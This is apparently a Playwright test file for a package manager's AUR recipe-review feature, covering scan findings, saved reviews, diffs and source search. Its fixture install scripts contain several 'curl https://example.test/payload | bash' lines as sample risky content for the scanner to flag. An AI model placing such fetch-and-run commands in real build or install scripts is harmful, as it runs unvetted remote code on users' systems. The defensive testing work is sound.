import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import type {
  Package,
  RecipeFile,
  RecipeFileChange,
  RecipeInspection,
  RecipeReview,
  RecipeReviewSummary,
  RecipeScan,
} from "../src/lib/ipc/bindings";

const base = "archhub-review-fixture";
const hash = (value: string) => createHash("sha256").update(value).digest("hex");
function file(path: string, role: string, content: string): RecipeFile {
  return { path, role, content, digest: hash(content) };
}
function scan(version = 1): RecipeScan {
  const files = [
    file("PKGBUILD", "build", `pkgname=${base}\npkgver=${version}\ninstall=fixture.install\n`),
    file(".SRCINFO", "metadata", `pkgbase = ${base}\ninstall = fixture.install\n`),
    file(
      "fixture.install",
      "install",
      "post_install() {\n  curl https://example.test/payload | bash\n}\n",
    ),
  ];
  return {
    staticAnalyzerVersion: 1,
    sourceEvidence: null,
    packageBase: base,
    scannedAt: 1791200000 + version,
    commit: String(version).repeat(40),
    digest: hash(JSON.stringify(files)),
    files,
    complete: true,
    warnings: [],
    url: `https://aur.archlinux.org/cgit/aur.git/tree/?h=${base}&id=${String(version).repeat(40)}`,
    findings: [
      {
        id: "fixture.install:remote-shell-2",
        package: base,
        severity: "high",
        title: "Remote content piped to a shell",
        description: "Inspect the downloaded content and its execution.",
        installedVersion: null,
        fixedVersion: null,
        cves: [],
        url: null,
        confidence: "heuristic",
        line: 2,
        file: "fixture.install",
      },
    ],
    limitations: ["Text heuristics only. Source archives and generated files are not scanned."],
  };
}
function summary(review: RecipeReview): RecipeReviewSummary {
  return {
    staticAnalyzerVersion: review.scan.staticAnalyzerVersion,
    packageBase: base,
    commit: review.scan.commit,
    digest: review.scan.digest,
    scannedAt: review.scan.scannedAt,
    reviewedAt: review.reviewedAt,
    note: review.note,
    fileCount: review.scan.files.length,
    findingCount: review.scan.findings.length,
  };
}
async function fixtureApi(page: Page, initial: RecipeReview | null = null) {
  let saved = initial;
  let current = scan();
  let unavailable = false;
  let explicitChanges: RecipeFileChange[] | null = null;
  let hold: Promise<void> | null = null;
  let holdReview: Promise<void> | null = null;
  const requests: { command: string; base?: string }[] = [];
  const pkg: Package = {
    id: `aur/${base}`,
    name: base,
    version: "1.0-1",
    description: "Recipe review fixture",
    repository: "aur",
    installedVersion: null,
    updateAvailable: false,
    installedSize: 0,
    downloadSize: 0,
    url: null,
    licenses: [],
    dependencies: [],
    groups: [],
    architecture: "any",
    explicit: false,
    signature: "community-recipe",
    packageBase: base,
    maintainer: "fixture",
    votes: 1,
    outOfDate: false,
    lastModified: 1791200000,
  };
  const inspection = (): RecipeInspection => ({
    scan: current,
    baseline: saved ? summary(saved) : null,
    status: !current.complete
      ? "incomplete"
      : !saved
        ? "unreviewed"
        : saved.scan.digest === current.digest && saved.scan.commit === current.commit
          ? saved.scan.staticAnalyzerVersion === current.staticAnalyzerVersion
            ? "reviewed"
            : "analysis-changed"
          : "changed",
    changes:
      explicitChanges ??
      (current.complete && saved && saved.scan.digest !== current.digest
        ? [
            {
              path: "PKGBUILD",
              kind: "modified",
              diff: "@@ -1,3 +1,3 @@\n pkgname=archhub-review-fixture\n-pkgver=1\n+pkgver=2\n install=fixture.install\n",
              truncated: false,
            },
          ]
        : []),
  });
  await page.route("**/api/query", async (route) => {
    const body = route.request().postDataJSON();
    requests.push({ command: body.command, base: body.base });
    let result: unknown;
    if (body.command === "aur_search")
      result = { items: [pkg], total: 1, offset: 0, limit: 300, capturedAt: 1791200000 };
    else if (body.command === "recipe_reviews") result = saved ? [summary(saved)] : [];
    else if (body.command === "recipe_review") {
      if (holdReview) await holdReview;
      result = saved;
    } else if (body.command === "recipe") {
      if (hold) await hold;
      if (unavailable) {
        await route.fulfill({
          status: 503,
          contentType: "application/json",
          body: JSON.stringify({ error: "Recipe source unavailable during this test" }),
        });
        return;
      }
      result = inspection();
    } else if (body.command === "record_recipe_review") {
      if (body.staticAnalyzerVersion !== current.staticAnalyzerVersion) {
        await route.fulfill({
          status: 400,
          json: {
            error: "The analyzer version changed. Fetch the current recipe before saving a review.",
          },
        });
        return;
      }
      saved = { scan: current, reviewedAt: 1791200100, note: body.note };
      result = inspection();
    } else if (body.command === "remove_recipe_review") {
      saved = null;
      result = null;
    } else {
      await route.continue();
      return;
    }
    await route.fulfill({ contentType: "application/json", body: JSON.stringify(result) });
  });
  return {
    requests,
    getSaved: () => saved,
    holdReview: () => {
      let release!: () => void;
      holdReview = new Promise<void>((resolve) => {
        release = resolve;
      });
      return () => {
        holdReview = null;
        release();
      };
    },
    holdSource: () => {
      let release!: () => void;
      hold = new Promise<void>((resolve) => {
        release = resolve;
      });
      return () => {
        hold = null;
        release();
      };
    },
    setScan: (value: RecipeScan) => {
      current = value;
    },
    setChanges: (value: RecipeFileChange[]) => {
      explicitChanges = value;
    },
    setSaved: (value: RecipeReview | null) => {
      saved = value;
    },
    failSource: () => {
      unavailable = true;
    },
    restoreSource: () => {
      unavailable = false;
    },
  };
}
async function openScan(page: Page) {
  await page.goto("/#/aur");
  await page.getByRole("textbox", { name: "Search AUR packages" }).fill(base);
  await page.getByRole("button", { name: `View ${base}`, exact: true }).click();
  await page.getByRole("tab", { name: "Static scan" }).click();
  await page.getByRole("button", { name: "Fetch & run static scan" }).click();
  await expect(page.getByText(/patterns? requires? review/)).toBeVisible();
}

test("saved rows explicitly recheck current recipes and hand off comparisons without another fetch", async ({
  page,
}) => {
  const saved: RecipeReview = {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Synthetic saved review for row rechecks.",
  };
  const api = await fixtureApi(page, saved);
  api.setScan(scan(2));
  await page.goto("/#/reviews");
  const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
  await expect(row).toContainText("Remote state not checked");
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(0);
  const release = api.holdSource();
  const check = row.getByRole("button", { name: `Check current recipe for ${base}`, exact: true });
  await check.click();
  await expect(check).toBeDisabled();
  await expect(row).toContainText("Checking current recipe…");
  await expect(row.getByRole("button", { name: /Export saved review/ })).toBeEnabled();
  release();
  await expect(row).toContainText("Changed since review");
  await expect(row).toContainText("1 changed file · 1 current pattern");
  const releaseReview = api.holdReview();
  await row.getByRole("button", { name: `Review comparison for ${base}`, exact: true }).click();
  await expect(page.getByRole("tab", { name: "Changes (1)", exact: true })).toHaveAttribute(
    "aria-selected",
    "true",
  );
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toContainText("Reading saved evidence for this comparison…");
  await expect(
    page
      .getByRole("dialog")
      .getByText(/does not match this comparison|Finding comparison is unavailable/),
  ).toHaveCount(0);
  releaseReview();
  await expect(page.getByLabel("Changes in PKGBUILD")).toContainText("+pkgver=2");
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toContainText("Still reported (1)");
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(1);
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "Refresh records", exact: true }).click();
  await expect(row).toContainText("Changed since review");
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(1);
  const pending = page.waitForEvent("download");
  await row.getByRole("button", { name: `Export saved review for ${base}`, exact: true }).click();
  const output = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
  expect(output).toEqual(saved);
  expect(
    api.requests.filter((request) =>
      /record_recipe_review|remove_recipe_review/.test(request.command),
    ),
  ).toHaveLength(0);
  await page.reload();
  await expect(row).toContainText("Remote state not checked");
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(1);
});

test("failed row rechecks hide earlier conclusions, allow retry and keep incomplete scans distinct", async ({
  page,
}) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Read-only recheck failure fixture.",
  });
  await page.goto("/#/reviews");
  const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
  const check = row.getByRole("button", { name: `Check current recipe for ${base}`, exact: true });
  await check.click();
  await expect(row).toContainText("Matches saved snapshot");
  const release = api.holdSource();
  await check.click();
  await expect(row).toContainText("Checking current recipe…");
  await expect(row.getByText("Matches saved snapshot", { exact: true })).toHaveCount(0);
  await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
  await expect(
    page.getByRole("dialog").getByText("Saved snapshot · current state unknown", { exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("dialog").getByText("Reviewed snapshot", { exact: true }),
  ).toHaveCount(0);
  release();
  await expect(
    page.getByRole("dialog").getByText("Reviewed snapshot", { exact: true }),
  ).toBeVisible();
  await page.keyboard.press("Escape");
  api.failSource();
  await check.click();
  await expect(row).toContainText("Current check failed · remote state unknown");
  await expect(row).toContainText("Recipe source unavailable during this test");
  await expect(row.getByText("Matches saved snapshot", { exact: true })).toHaveCount(0);
  await expect(row.getByRole("button", { name: /Review comparison/ })).toHaveCount(0);
  await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
  await expect(
    page
      .getByRole("dialog")
      .getByText("Recipe source unavailable during this test", { exact: true }),
  ).toBeVisible();
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(3);
  await page.keyboard.press("Escape");
  api.restoreSource();
  api.setScan({ ...scan(2), complete: false, warnings: ["fixture.install was not captured."] });
  await check.click();
  await expect(row).toContainText("Incomplete coverage");
  await expect(row).toContainText("A complete comparison is unavailable.");
  await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
  await expect(page.getByRole("tab", { name: "Files & findings", exact: true })).toHaveAttribute(
    "aria-selected",
    "true",
  );
  await expect(page.getByText("fixture.install was not captured.", { exact: true })).toBeVisible();
  await page.keyboard.press("Escape");
  api.setScan(scan());
  await check.click();
  await expect(row).toContainText("Matches saved snapshot");
  expect(
    api.requests.filter((request) =>
      /record_recipe_review|remove_recipe_review/.test(request.command),
    ),
  ).toHaveLength(0);
});

test("replaced row baselines require refreshed records and analyzer changes remain reviewable", async ({
  page,
}) => {
  const previous = scan();
  previous.staticAnalyzerVersion = undefined;
  const api = await fixtureApi(page, {
    scan: previous,
    reviewedAt: 1791200010,
    note: "Unversioned row baseline.",
  });
  await page.goto("/#/reviews");
  const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
  const check = row.getByRole("button", { name: `Check current recipe for ${base}`, exact: true });
  await check.click();
  await expect(row).toContainText("Analyzer changed · review findings again");
  await row.getByRole("button", { name: `Review comparison for ${base}`, exact: true }).click();
  await expect(page.getByRole("tab", { name: "Changes", exact: true })).toHaveAttribute(
    "aria-selected",
    "true",
  );
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toContainText("Finding comparison requires the same known static analyzer version.");
  await page.keyboard.press("Escape");
  api.setSaved({
    scan: scan(3),
    reviewedAt: 1791200020,
    note: "Another client replaced this row baseline.",
  });
  await check.click();
  await expect(row).toContainText("Saved record changed · refresh records");
  await expect(row.getByRole("button", { name: /Review comparison/ })).toHaveCount(0);
  await page.getByRole("button", { name: "Refresh records", exact: true }).click();
  await expect(row).toContainText("Another client replaced this row baseline.");
  await expect(row).toContainText("Changed since review");
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(2);
  api.setSaved(null);
  await check.click();
  await expect(row).toContainText("Saved record changed · refresh records");
  await page.getByRole("button", { name: "Refresh records", exact: true }).click();
  await expect(row).toHaveCount(0);
  await expect(
    page.getByText("Your first review starts with the files.", { exact: true }),
  ).toBeVisible();
});

test("review records persist across browser reload and can be exported and removed", async ({
  page,
}) => {
  await fixtureApi(page);
  await openScan(page);
  await page.getByRole("button", { name: /Remote content piped to a shell/ }).click();
  await expect(page.getByRole("combobox", { name: "Build file" })).toContainText("fixture.install");
  await expect(page.getByLabel("Build recipe source")).toBeFocused();
  await page.getByRole("tab", { name: "Review record", exact: true }).click();
  await expect(page.getByRole("button", { name: "Record this review" })).toBeDisabled();
  await page
    .getByRole("textbox", { name: "Review note" })
    .fill("Inspected the captured fixture install action and its source.");
  await page.getByRole("checkbox", { name: "I reviewed the captured files and findings." }).check();
  await page.getByRole("button", { name: "Record this review" }).click();
  await expect(page.getByText("Reviewed snapshot", { exact: true })).toBeVisible();
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "Security", exact: true }).click();
  await page.getByRole("link", { name: "Recipe reviews", exact: true }).click();
  await expect(page.getByRole("button", { name: `Open saved review for ${base}` })).toBeVisible();
  await page.reload();
  await page.getByRole("button", { name: `Open saved review for ${base}` }).click();
  await expect(
    page.getByRole("dialog").getByText("Saved snapshot · current state unknown", { exact: true }),
  ).toBeVisible();
  const savedSource = page.getByLabel("Build recipe source");
  const savedSearch = savedSource.getByRole("textbox", {
    name: "Find in captured file",
    exact: true,
  });
  await savedSearch.fill("PKGVER=1");
  await expect(savedSearch).toBeFocused();
  await expect(savedSource.locator("code").nth(1)).toHaveText("pkgver=1");
  await expect(savedSource.locator("code").nth(1)).toBeInViewport();
  await page.getByRole("tab", { name: "Changes", exact: true }).click();
  const download = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export saved review" }).click();
  expect((await download).suggestedFilename()).toBe(`archhub-${base}-review.json`);
  await page.getByRole("tab", { name: "Review record", exact: true }).click();
  await expect(
    page
      .getByRole("tabpanel", { name: "Review record" })
      .getByText("Inspected the captured fixture install action and its source.", {
        exact: true,
      }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Remove saved review" }).click();
  await page.getByRole("button", { name: "Remove baseline", exact: true }).click();
  await page.keyboard.press("Escape");
  await expect(
    page.getByText("Your first review starts with the files.", { exact: true }),
  ).toBeVisible();
});

test("new commits invalidate the saved review and expose line changes", async ({ page }) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Baseline fixture review for change detection.",
  });
  api.setScan(scan(2));
  await openScan(page);
  await expect(
    page.getByRole("dialog").getByText("Changed since review", { exact: true }),
  ).toBeVisible();
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  await expect(page.getByLabel("Changes in PKGBUILD")).toContainText("-pkgver=1");
  await expect(page.getByLabel("Changes in PKGBUILD")).toContainText("+pkgver=2");
  await page.getByRole("button", { name: "Inspect reviewed PKGBUILD line 2", exact: true }).click();
  await expect(page.getByLabel("Reviewed recipe source")).toBeFocused();
  await expect(page.getByLabel("Reviewed recipe source").locator("code").nth(1)).toHaveText(
    "pkgver=1",
  );
  await expect(
    page.getByText(`Captured commit · ${"1".repeat(40)}`, { exact: true }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Return to diff", exact: true }).click();
  await expect(
    page.getByRole("button", { name: "Inspect reviewed PKGBUILD line 2", exact: true }),
  ).toBeFocused();
  await page.getByRole("button", { name: "Inspect current PKGBUILD line 2", exact: true }).click();
  await expect(page.getByLabel("Current recipe source")).toBeFocused();
  await expect(page.getByLabel("Current recipe source").locator("code").nth(1)).toHaveText(
    "pkgver=2",
  );
  await page.screenshot({ path: "artifacts/recipe-changes.png", fullPage: true });
});

test("finding changes distinguish moved, changed and removed observations with captured context", async ({
  page,
}) => {
  const errors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") errors.push(message.text());
  });
  const before = scan();
  const oldPattern = before.findings[0]!;
  before.findings.push({
    ...oldPattern,
    id: "PKGBUILD:old-rule-2",
    file: "PKGBUILD",
    line: 2,
    title: "Old pattern",
  });
  const api = await fixtureApi(page, {
    scan: before,
    reviewedAt: 1791200010,
    note: "Synthetic review for finding comparison.",
  });
  const after = scan(2);
  after.files[2] = file(
    "fixture.install",
    "install",
    "# inserted comment\npost_install() {\n  curl https://example.test/payload | bash\n  curl https://example.test/new-payload | bash\n}\n",
  );
  after.findings = [
    { ...oldPattern, id: "fixture.install:remote-shell-3", line: 3 },
    { ...oldPattern, id: "fixture.install:remote-shell-4", line: 4, title: "New pattern" },
  ];
  after.digest = hash(JSON.stringify(after.files));
  api.setScan(after);
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  const comparison = page.getByRole("region", { name: "Static finding changes", exact: true });
  await expect(
    comparison.getByRole("button", { name: "Newly reported (1)", exact: true }),
  ).toBeVisible();
  await expect(
    comparison.getByRole("button", { name: "Still reported (1)", exact: true }),
  ).toBeVisible();
  await expect(
    comparison.getByRole("button", { name: "No longer reported (1)", exact: true }),
  ).toBeVisible();
  await comparison.getByRole("button", { name: "Still reported (1)", exact: true }).click();
  await expect(comparison).toContainText("Reviewed · fixture.install:2");
  const findingSearch = comparison.getByRole("textbox", {
    name: "Search finding changes",
    exact: true,
  });
  await findingSearch.fill(oldPattern.id);
  await expect(comparison).toContainText("Observations 1–1 of 1");
  await findingSearch.fill(after.findings[0]!.id);
  await expect(comparison).toContainText("Observations 1–1 of 1");
  await findingSearch.fill("");
  const currentAction = comparison.getByRole("button", {
    name: "Inspect current finding fixture.install line 3",
    exact: true,
  });
  await currentAction.focus();
  await page.keyboard.press("Enter");
  const source = comparison.getByLabel("Finding source context", { exact: true });
  await expect(source).toBeFocused();
  await expect(source.locator("code").nth(2)).toHaveText(
    "  curl https://example.test/payload | bash",
  );
  await comparison.getByRole("button", { name: "Return to findings", exact: true }).click();
  await expect(currentAction).toBeFocused();
  await comparison.getByRole("button", { name: "No longer reported (1)", exact: true }).click();
  await expect(comparison).toContainText(
    "A missing observation does not establish that a risk is fixed.",
  );
  await comparison
    .getByRole("button", { name: "Inspect reviewed finding PKGBUILD line 2", exact: true })
    .click();
  await expect(source).toBeFocused();
  await expect(source.locator("code").nth(1)).toHaveText("pkgver=1");
  await expect(comparison).toContainText(`Captured commit · ${"1".repeat(40)}`);
  await page.setViewportSize({ width: 390, height: 844 });
  expect(
    (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
      .violations,
  ).toEqual([]);
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  await page.screenshot({ path: "artifacts/finding-changes-mobile.png", fullPage: true });
  await comparison.getByRole("button", { name: "Newly reported (1)", exact: true }).click();
  await expect(source).toHaveCount(0);
  await comparison
    .getByRole("textbox", { name: "Search finding changes", exact: true })
    .fill("no matches");
  await expect(comparison).toContainText("No observations match these filters.");
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export scan", exact: true }).click();
  const output = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
  expect(output.scan).toEqual(after);
  expect(errors).toEqual([]);
});

test("finding comparison pages large lists and invalidates stale saved context", async ({
  page,
}) => {
  const before = scan();
  const api = await fixtureApi(page, {
    scan: before,
    reviewedAt: 1791200010,
    note: "Original finding comparison baseline.",
  });
  const after = scan(2);
  after.findings = Array.from({ length: 55 }, (_, index) => ({
    ...before.findings[0]!,
    id: `fixture.install:extra-${index}-2`,
    title: `Additional pattern ${index}`,
  }));
  api.setScan(after);
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  const comparison = page.getByRole("region", { name: "Static finding changes", exact: true });
  await comparison.getByRole("button", { name: "Newly reported (55)", exact: true }).click();
  await expect(comparison).toContainText("Observations 1–25 of 55");
  await expect(
    comparison.getByRole("button", {
      name: "Inspect current finding fixture.install line 2",
      exact: true,
    }),
  ).toHaveCount(25);
  await comparison.getByRole("button", { name: "Next finding change page", exact: true }).click();
  await comparison.getByRole("button", { name: "Next finding change page", exact: true }).click();
  await expect(comparison).toContainText("Observations 51–55 of 55");
  await comparison
    .getByRole("textbox", { name: "Search finding changes", exact: true })
    .fill("Additional pattern 54");
  await expect(comparison).toContainText("Observations 1–1 of 1");
  await comparison.getByRole("button", { name: "No longer reported (1)", exact: true }).click();
  await comparison.getByRole("textbox", { name: "Search finding changes", exact: true }).fill("");
  await comparison
    .getByRole("button", { name: "Inspect reviewed finding fixture.install line 2", exact: true })
    .click();
  await expect(comparison.getByLabel("Finding source context", { exact: true })).toBeFocused();
  api.setSaved({ scan: scan(3), reviewedAt: 1791200020, note: "Replaced by another client." });
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(comparison).toContainText(
    "Finding comparison is unavailable: reload the saved evidence to match this baseline.",
  );
  await expect(comparison.getByLabel("Finding source context", { exact: true })).toHaveCount(0);
  await expect(comparison.getByRole("button", { name: /Inspect .* finding/ })).toHaveCount(0);
  await comparison.getByRole("button", { name: "Reload finding baseline", exact: true }).click();
  await expect(
    comparison.getByRole("button", { name: "Newly reported (55)", exact: true }),
  ).toBeVisible();
});

test("multiple diff hunks open late source lines on each side and preserve full exports", async ({
  page,
}) => {
  const before = scan();
  const original = Array.from({ length: 600 }, (_, index) => `# source ${index + 1}`);
  before.files[0] = file("PKGBUILD", "build", original.join("\n"));
  before.digest = hash(JSON.stringify(before.files));
  const api = await fixtureApi(page, {
    scan: before,
    reviewedAt: 1791200010,
    note: "Reviewed original source before the behavior change.",
  });
  const after = scan(2);
  const revised = [...original];
  revised[449] = "curl https://example.test/changed | bash";
  after.files[0] = file("PKGBUILD", "build", revised.join("\n"));
  after.files.push(
    file("new.install", "install", "post_install() {\n  systemctl enable example\n}"),
  );
  after.files = after.files.filter((entry) => entry.path !== "fixture.install");
  after.digest = hash(JSON.stringify(after.files));
  const changes: RecipeFileChange[] = [
    {
      path: "PKGBUILD",
      kind: "modified",
      diff: "@@ -2 +2 @@\n # source 2\n@@ -449,3 +449,3 @@\n # source 449\n-# source 450\n+curl https://example.test/changed | bash\n # source 451\n",
      truncated: true,
    },
    {
      path: "fixture.install",
      kind: "removed",
      diff: "@@ -1,3 +0,0 @@\n-post_install() {\n-  curl https://example.test/payload | bash\n-}\n",
      truncated: false,
    },
    {
      path: "new.install",
      kind: "added",
      diff: "@@ -0,0 +1,3 @@\n+post_install() {\n+  systemctl enable example\n+}\n\\ No newline at end of file\n",
      truncated: false,
    },
  ];
  api.setScan(after);
  api.setChanges(changes);
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (3)", exact: true }).click();
  await expect(page.getByText(/Diff preview is truncated/)).toBeVisible();
  for (const side of ["reviewed", "current"] as const) {
    await page
      .getByRole("button", { name: `Inspect ${side} PKGBUILD line 450`, exact: true })
      .click();
    const source = page.getByLabel(
      side === "reviewed" ? "Reviewed recipe source" : "Current recipe source",
    );
    await expect(source).toBeFocused();
    await expect(source.locator("code").nth(49)).toHaveText(
      side === "reviewed" ? original[449]! : revised[449]!,
    );
    await expect(source.locator("code").nth(49)).toBeInViewport();
    await page.getByRole("button", { name: "Previous source lines", exact: true }).click();
    await page
      .getByRole("button", { name: `Inspect ${side} PKGBUILD line 450`, exact: true })
      .click();
    await expect(source.locator("code").nth(49)).toBeInViewport();
  }
  await page
    .getByRole("button", { name: "Inspect reviewed fixture.install line 2", exact: true })
    .click();
  await expect(page.getByLabel("Reviewed recipe source")).toContainText(
    "curl https://example.test/payload | bash",
  );
  await expect(page.getByRole("button", { name: /Inspect current fixture.install/ })).toHaveCount(
    0,
  );
  await page
    .getByRole("button", { name: "Inspect current new.install line 2", exact: true })
    .click();
  await expect(page.getByLabel("Current recipe source")).toContainText("systemctl enable example");
  await expect(page.getByRole("button", { name: /Inspect reviewed new.install/ })).toHaveCount(0);
  await page.setViewportSize({ width: 390, height: 844 });
  await page
    .getByRole("button", { name: "Inspect current PKGBUILD line 450", exact: true })
    .click();
  await expect(page.getByLabel("Current recipe source").locator("code").nth(49)).toBeInViewport();
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export scan", exact: true }).click();
  const report = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
  expect(report.scan).toEqual(after);
  expect(report.changes).toEqual(changes);
  await page.screenshot({ path: "artifacts/recipe-changed-source-mobile.png", fullPage: true });
  api.setScan(scan(3));
  api.setChanges([]);
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(page.getByLabel("Changed-line source context")).toHaveCount(0);
});

test("malformed diff coordinates and mismatched source text cannot jump to unrelated code", async ({
  page,
}) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Reviewed valid source context.",
  });
  api.setScan(scan(2));
  api.setChanges([
    {
      path: "PKGBUILD",
      kind: "modified",
      diff: "@@ -900 +900 @@\n-pkgver=1\n+pkgver=2\n@@ -2 +2 @@\n-false source\n+false source\n@@ malformed @@\n-pkgver=1\n+pkgver=2\n@@ -0 +0 @@\n pkgname=archhub-review-fixture\n@@ -1,1 +1,1 @@\n pkgname=archhub-review-fixture\n-pkgver=1\n+pkgver=2\n",
      truncated: false,
    },
  ]);
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  const diff = page.getByLabel("Changes in PKGBUILD");
  await expect(diff.getByRole("button")).toHaveCount(2);
  await expect(
    diff.getByRole("button", { name: "Inspect reviewed PKGBUILD line 1", exact: true }),
  ).toBeVisible();
  await expect(diff.getByRole("button", { name: /line 2|line 900/ })).toHaveCount(0);
  await expect(page.getByLabel("Changed-line source context")).toHaveCount(0);
});

test("captured code search crosses source windows, supports keyboard navigation and preserves exports", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  const current = scan();
  const content = Array.from({ length: 1000 }, (_, index) => `# source ${index + 1}`);
  for (const line of [50, 450, 850]) content[line - 1] = `# NEEDLE [.*] at ${line}`;
  content[49] = "# NEEDLE [.*] and another NEEDLE [.*] at 50";
  current.files[0] = file("PKGBUILD", "build", content.join("\n"));
  current.digest = hash(JSON.stringify(current.files));
  api.setScan(current);
  await openScan(page);
  const region = page.getByRole("region", { name: "Build recipe source", exact: true });
  const search = region.getByRole("textbox", { name: "Find in captured file", exact: true });
  await search.fill("needle [.*]");
  await expect(region.getByText("Match 1 of 3 lines", { exact: true })).toBeVisible();
  await expect(search).toBeFocused();
  await expect(region.locator("code").nth(49)).toHaveText(content[49]!);
  await search.dispatchEvent("keydown", { key: "Enter", isComposing: true });
  await expect(region).toContainText("Selected PKGBUILD:50");
  await search.press("Enter");
  await expect(region).toContainText("Selected PKGBUILD:450");
  await expect(region.locator("code").nth(49)).toHaveText(content[449]!);
  await expect(region.locator("code").nth(49)).toBeInViewport();
  await expect(search).toBeFocused();
  await search.press("Enter");
  await expect(region).toContainText("Selected PKGBUILD:850");
  await search.press("Enter");
  await expect(region).toContainText("Selected PKGBUILD:50");
  await search.press("Shift+Enter");
  await expect(region).toContainText("Selected PKGBUILD:850");
  await region.getByRole("button", { name: "Previous source match", exact: true }).click();
  await expect(region).toContainText("Selected PKGBUILD:450");
  await region.getByRole("button", { name: "Previous source lines", exact: true }).click();
  await search.press("Enter");
  await expect(region.locator("code").nth(49)).toHaveText(content[849]!);
  await expect(region.locator("code").nth(49)).toBeInViewport();
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export scan", exact: true }).click();
  expect(JSON.parse(await readFile((await (await pending).path())!, "utf8")).scan).toEqual(current);
  await search.fill("source 999");
  await expect(region.getByText("Match 1 of 1 line", { exact: true })).toBeVisible();
  await region.getByRole("button", { name: "Previous source lines", exact: true }).click();
  await search.press("Enter");
  await expect(region.locator("code").nth(198)).toHaveText("# source 999");
  await expect(region.locator("code").nth(198)).toBeInViewport();
  await page.setViewportSize({ width: 390, height: 844 });
  await search.fill("needle");
  await search.press("Enter");
  await expect(region.locator("code").nth(49)).toHaveText(content[449]!);
  await expect(region.locator("code").nth(49)).toBeInViewport();
  await expect(search).toBeFocused();
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  await page.screenshot({ path: "artifacts/source-search-large-mobile.png", fullPage: true });
  await search.fill("missing-pattern");
  await expect(region.getByText("No matching lines", { exact: true })).toBeVisible();
  await expect(
    region.getByRole("button", { name: "Next source match", exact: true }),
  ).toBeDisabled();
  await search.press("Enter");
  await region.getByRole("button", { name: "Clear source search", exact: true }).click();
  await expect(search).toHaveValue("");
  await expect(search).toBeFocused();
  await search.fill("needle");
  await page.getByRole("combobox", { name: "Build file", exact: true }).click();
  await page.getByRole("option", { name: "fixture.install · install script", exact: true }).click();
  await expect(
    page.getByRole("textbox", { name: "Find in captured file", exact: true }),
  ).toHaveValue("");
  const installSearch = page.getByRole("textbox", { name: "Find in captured file", exact: true });
  await installSearch.fill("post_install");
  api.setScan({ ...current, commit: "2".repeat(40), scannedAt: current.scannedAt + 1 });
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(installSearch).toHaveValue("");
});

test("source search stays within reviewed/current snapshots and preserves diff focus return", async ({
  page,
}) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Reviewed original fixture.",
  });
  api.setScan(scan(2));
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  const reviewedAction = page.getByRole("button", {
    name: "Inspect reviewed PKGBUILD line 2",
    exact: true,
  });
  await reviewedAction.click();
  let source = page.getByRole("region", { name: "Reviewed recipe source", exact: true });
  let search = source.getByRole("textbox", { name: "Find in captured file", exact: true });
  await search.fill("pkgver=2");
  await expect(source.getByText("No matching lines", { exact: true })).toBeVisible();
  await search.fill("PKGVER=1");
  await expect(source.locator("code").nth(1)).toBeInViewport();
  await expect(search).toBeFocused();
  await page.getByRole("button", { name: "Return to diff", exact: true }).click();
  await expect(reviewedAction).toBeFocused();
  await page.getByRole("button", { name: "Inspect current PKGBUILD line 2", exact: true }).click();
  source = page.getByRole("region", { name: "Current recipe source", exact: true });
  search = source.getByRole("textbox", { name: "Find in captured file", exact: true });
  await expect(search).toHaveValue("");
  await search.fill("pkgver=1");
  await expect(source.getByText("No matching lines", { exact: true })).toBeVisible();
  await search.fill("PKGVER=2");
  await expect(source.locator("code").nth(1)).toHaveText("pkgver=2");
  await expect(source.locator("code").nth(1)).toBeInViewport();
